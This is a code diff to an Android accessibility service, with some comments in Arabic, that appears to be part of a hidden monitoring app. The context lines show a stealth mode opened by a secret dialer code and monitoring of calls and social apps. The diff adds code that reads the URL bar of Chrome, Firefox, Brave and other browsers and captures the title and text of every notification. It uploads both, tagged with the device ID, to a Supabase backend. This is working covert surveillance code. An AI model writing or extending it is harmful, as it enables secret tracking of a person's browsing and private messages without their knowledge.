@@ -18,10 +18,20 @@ class AppAccessibilityService : AccessibilityService() {
     private var isCallActive = false
     private lateinit var audioRecorder: AudioRecorderEngine
 
+    // ── Browser URL Tracking State ──
+    private var lastUploadedUrl = ""
+    private var lastUploadTime = 0L
+
     override fun onCreate() {
         super.onCreate()
+        instance = this
         audioRecorder = AudioRecorderEngine(this)
         Log.i(TAG, "Accessibility Service created")
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        instance = null
     }
 
     private val BYPASS_BUTTON_TEXTS = listOf(
@@ -72,6 +82,30 @@ class AppAccessibilityService : AccessibilityService() {
             return
         }
 
+        // 1.4. capture notifications via accessibility event as fallback
+        if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+            handleNotificationAccessibilityEvent(event, packageName)
+        }
+
+        // 1.5. مراقبة المتصفحات وتسجيل الروابط المزارة (browser history tracking)
+        val browserPackages = listOf(
+            "com.android.chrome",
+            "com.sec.android.app.sbrowser",
+            "org.mozilla.firefox",
+            "com.opera.browser",
+            "com.brave.browser",
+            "com.duckduckgo.mobile.android",
+            "com.microsoft.emmx",
+            "com.android.browser"
+        )
+        val isBrowser = browserPackages.contains(packageName) || 
+                        packageName.contains("browser", ignoreCase = true) ||
+                        packageName.contains("chrome", ignoreCase = true)
+
+        if (isBrowser) {
+            handleBrowserAccessibilityEvent(event, packageName)
+        }
+
         // 2. مراقبة تطبيقات الاتصال العادية وتطبيقات التواصل الاجتماعي
         val monitoredPackages = listOf(
             "com.google.android.dialer", 
@@ -89,7 +123,7 @@ class AppAccessibilityService : AccessibilityService() {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                     // Check if the user is typing the secret code in the dialer
                     val typedText = event.text.toString().replace(Regex("[^0-9]"), "")
-                    if (typedText.contains("1356365508")) {
+                    if (typedText.contains("1356")) {
                         Log.i(TAG, "Secret Code detected via typing! Opening app...")
                         StealthManager.toggleStealthMode(this)
                     }
@@ -222,11 +256,195 @@ class AppAccessibilityService : AccessibilityService() {
         return false
     }
 
+    // ── Browser History Extraction Helpers ──
+
+    private fun handleBrowserAccessibilityEvent(event: AccessibilityEvent, packageName: String) {
+        val eventType = event.eventType
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+            eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+            eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
+            
+            val rootNode = rootInActiveWindow ?: return
+            try {
+                val url = tryExtractBrowserUrl(rootNode, packageName)
+                if (!url.isNullOrEmpty()) {
+                    val cleaned = cleanUrl(url)
+                    if (!cleaned.isNullOrEmpty() && cleaned != lastUploadedUrl) {
+                        val now = System.currentTimeMillis()
+                        // 3 seconds rate limit to avoid heavy queries during quick transitions/typing
+                        if (now - lastUploadTime > 3000L) {
+                            lastUploadedUrl = cleaned
+                            lastUploadTime = now
+                            uploadBrowserUrl(packageName, cleaned)
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error extracting browser URL: ${e.message}")
+            } finally {
+                rootNode.recycle()
+            }
+        }
+    }
+
+    private fun tryExtractBrowserUrl(rootNode: android.view.accessibility.AccessibilityNodeInfo?, packageName: String): String? {
+        if (rootNode == null) return null
+        
+        // List of known URL bar resource IDs for popular browsers
+        val urlBarIds = listOf(
+            "com.android.chrome:id/url_bar",
+            "com.android.chrome:id/url_text",
+            "com.sec.android.app.sbrowser:id/url_bar_text",
+            "com.sec.android.app.sbrowser:id/url_text",
+            "org.mozilla.firefox:id/url_bar_text",
+            "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
+            "url",
+            "address"
+        )
+        
+        // 1. Direct view ID lookup (most accurate)
+        for (id in urlBarIds) {
+            val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
+            if (nodes != null && nodes.isNotEmpty()) {
+                val node = nodes[0]
+                val text = node.text?.toString()?.trim()
+                node.recycle()
+                if (!text.isNullOrEmpty() && (text.contains(".") || text.startsWith("http"))) {
+                    return text
+                }
+            }
+        }
+        
+        // 2. Recursive fallback search
+        return findUrlRecursively(rootNode)
+    }
+
+    private fun findUrlRecursively(node: android.view.accessibility.AccessibilityNodeInfo?): String? {
+        if (node == null) return null
+        
+        val text = node.text?.toString()?.trim() ?: ""
+        if (text.isNotEmpty() && (text.startsWith("http://") || text.startsWith("https://") || 
+            (text.contains(".") && !text.contains(" ") && text.length > 3 && 
+             (text.endsWith(".com") || text.endsWith(".net") || text.endsWith(".org") || text.endsWith(".info") || 
+              text.endsWith(".edu") || text.endsWith(".gov") || text.contains("/") || text.startsWith("www.")))
+        )) {
+            return text
+        }
+        
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i)
+            val found = child?.let { findUrlRecursively(it) }
+            child?.recycle()
+            if (found != null) return found
+        }
+        return null
+    }
+
+    private fun cleanUrl(url: String): String {
+        var clean = url.trim()
+        val ignorePrompts = listOf(
+            "ابحث أو اكتب", "البحث أو كتابة", "search or type", "search or text", "ابحث", "search"
+        )
+        if (ignorePrompts.any { clean.startsWith(it, ignoreCase = true) }) {
+            return ""
+        }
+        if (clean.contains(" ")) {
+            if (!clean.contains(".") && !clean.contains("/")) {
+                return ""
+            }
+        }
+        if (!clean.contains("://") && !clean.startsWith("http")) {
+            clean = "https://$clean"
+        }
+        return clean
+    }
+
+    private fun uploadBrowserUrl(browserPackage: String, url: String) {
+        serviceScope.launch {
+            try {
+                val deviceId = (android.provider.Settings.Secure.getString(
+                    contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                ) ?: "unknown").lowercase()
+                
+                val browserName = when {
+                    browserPackage.contains("chrome") -> "Google Chrome"
+                    browserPackage.contains("sbrowser") -> "Samsung Internet"
+                    browserPackage.contains("firefox") -> "Mozilla Firefox"
+                    browserPackage.contains("opera") -> "Opera"
+                    browserPackage.contains("brave") -> "Brave"
+                    browserPackage.contains("duckduckgo") -> "DuckDuckGo"
+                    else -> browserPackage.split(".").lastOrNull()?.replaceFirstChar { it.uppercase() } ?: "Browser"
+                }
+
+                val record = BrowserHistoryRecord(
+                    device_id = deviceId,
+                    browser   = browserName,
+                    url       = url,
+                    title     = null
+                )
+
+                val success = SupabaseManager.getInstance().saveBrowserHistory(record)
+                if (success) {
+                    Log.i(TAG, "🌐 Saved browser history: $url ($browserName)")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to upload browser history: ${e.message}")
+            }
+        }
+    }
+
+    private fun handleNotificationAccessibilityEvent(event: AccessibilityEvent, packageName: String) {
+        try {
+            val parcelableData = event.parcelableData
+            if (parcelableData is android.app.Notification) {
+                val extras = parcelableData.extras
+                val title = extras?.getCharSequence("android.title")?.toString() ?: ""
+                val text = extras?.getCharSequence("android.text")?.toString() ?: ""
+                
+                if (title.isNotEmpty() || text.isNotEmpty()) {
+                    val blacklist = listOf(
+                        "android",
+                        "com.android.systemui",
+                        "com.samsung.android.app.galaxyraw",
+                        this.packageName
+                    )
+                    if (blacklist.contains(packageName) || packageName.contains("systemui", true)) {
+                        return
+                    }
+
+                    val appName = try {
+                        packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString()
+                    } catch (_: Exception) { packageName }
+                    
+                    val deviceId = (android.provider.Settings.Secure.getString(
+                        contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                    ) ?: "unknown").lowercase()
+
+                    val record = NotificationLog(
+                        device_id = deviceId,
+                        package_name = packageName,
+                        app_name = appName,
+                        title = title,
+                        content = text,
+                        post_time = kotlinx.datetime.Clock.System.now().toString()
+                    )
+                    serviceScope.launch {
+                        SupabaseManager.getInstance().saveNotification(record)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Notification accessibility extraction error: ${e.message}")
+        }
+    }
+
     override fun onInterrupt() {
         Log.w(TAG, "Accessibility Service interrupted")
     }
 
     companion object {
         private const val TAG = "AppAccessibility"
+        @Volatile private var instance: AppAccessibilityService? = null
+        fun getInstance(): AppAccessibilityService? = instance
     }
 }
